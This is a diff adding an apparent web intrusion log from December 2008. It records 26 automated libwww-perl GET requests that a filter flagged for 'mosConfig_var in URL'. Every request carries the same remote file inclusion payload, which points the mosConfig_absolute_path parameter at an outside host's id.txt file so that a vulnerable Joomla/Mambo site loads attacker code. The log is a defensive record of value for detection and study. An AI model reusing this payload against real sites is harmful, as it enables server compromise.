@@ -1,0 +1,27 @@
+Date	Time	Cause	IP	Name	User agent	Request method	Request URI	Comment
+2008-12-07	19:55:22	mosConfig_var in URL	67.19.49.74	server1.ddfnet.com.br	libwww-perl/5.820	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	19:55:22	mosConfig_var in URL	67.18.189.2	2.bd.1243.static.theplanet.com	libwww-perl/5.811	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	19:55:24	mosConfig_var in URL	67.18.223.26	1a.df.1243.static.theplanet.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	19:55:44	mosConfig_var in URL	74.53.67.242	dnsnetservers.com	libwww-perl/5.814	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	19:55:51	mosConfig_var in URL	69.20.5.44	139412-app1.mundochiapas.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	19:56:03	mosConfig_var in URL	209.87.224.174	mail.digitalnetworks.ca	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	19:56:06	mosConfig_var in URL	64.13.223.140	richardalmasi.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:00:23	mosConfig_var in URL	91.186.15.66	vctech.fbyne.com	libwww-perl/5.805	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:00:53	mosConfig_var in URL	86.109.104.39	host.capricedecor.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:01:14	mosConfig_var in URL	86.109.167.55	a0062.abansys.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:02:38	mosConfig_var in URL	67.18.189.2	2.bd.1243.static.theplanet.com	libwww-perl/5.811	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:02:38	mosConfig_var in URL	67.19.49.74	server1.ddfnet.com.br	libwww-perl/5.820	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:02:38	mosConfig_var in URL	74.53.67.242	dnsnetservers.com	libwww-perl/5.814	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:02:43	mosConfig_var in URL	67.18.223.26	1a.df.1243.static.theplanet.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:02:52	mosConfig_var in URL	83.172.138.38	ns1.xs4free.eu	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:02:56	mosConfig_var in URL	69.20.5.44	139412-app1.mundochiapas.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:03:13	mosConfig_var in URL	209.87.224.174	mail.digitalnetworks.ca	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:04:28	mosConfig_var in URL	64.13.223.140	richardalmasi.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:05:33	mosConfig_var in URL	86.109.167.55	a0062.abansys.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:05:37	mosConfig_var in URL	91.186.15.66	vctech.fbyne.com	libwww-perl/5.805	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:07:24	mosConfig_var in URL	86.109.104.39	host.capricedecor.com	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:28:25	mosConfig_var in URL	91.142.211.175	pleskl16.axarnet.es	libwww-perl/5.805	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:32:23	mosConfig_var in URL	211.202.2.71	web-71.blueweb.co.kr	libwww-perl/5.79	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	20:52:41	mosConfig_var in URL	209.58.87.30	209.58.87.30	libwww-perl/5.812	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	21:02:42	mosConfig_var in URL	91.142.211.175	pleskl16.axarnet.es	libwww-perl/5.805	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
+2008-12-07	21:31:55	mosConfig_var in URL	209.58.87.30	209.58.87.30	libwww-perl/5.812	GET	/?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path=http://designtrupe.pt/id.txt?	
